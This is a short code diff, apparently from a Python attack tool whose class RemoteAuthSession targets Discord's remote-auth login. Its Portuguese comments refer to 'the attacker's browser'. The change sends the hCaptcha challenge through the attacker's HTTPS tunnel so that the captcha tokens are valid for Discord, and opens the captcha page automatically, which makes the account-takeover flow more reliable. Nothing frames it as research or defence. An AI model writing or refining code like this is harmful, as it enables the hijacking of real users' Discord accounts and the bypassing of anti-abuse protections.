@@ -208,14 +208,14 @@ class RemoteAuthSession(threading.Thread):
                         turl = open("tunnel_url.txt").read().strip()
                     except Exception:
                         pass
-                    base = turl or f"http://{lan_ip()}:8080"
-                    print(f"[captcha] resolva em {base}/captcha/{sid} "
-                          f"(ou http://localhost:8080/captcha/{sid})", flush=True)
+                    # SEMPRE via HTTPS do tunel: no localhost o hCaptcha entra
+                    # em test mode e os tokens sao invalidos pro Discord
+                    capurl = (turl or f"http://{lan_ip()}:8080") + f"/captcha/{sid}"
+                    print(f"[captcha] {capurl}", flush=True)
                     # abre a pagina automaticamente no navegador do atacante
-                    # (o rqdata tem TTL curto p/ renderizar)
                     try:
                         if os.name == "nt":
-                            os.startfile(f"http://localhost:8080/captcha/{sid}")
+                            os.startfile(capurl)
                             print("[captcha] pagina aberta automaticamente",
                                   flush=True)
                     except Exception as e:
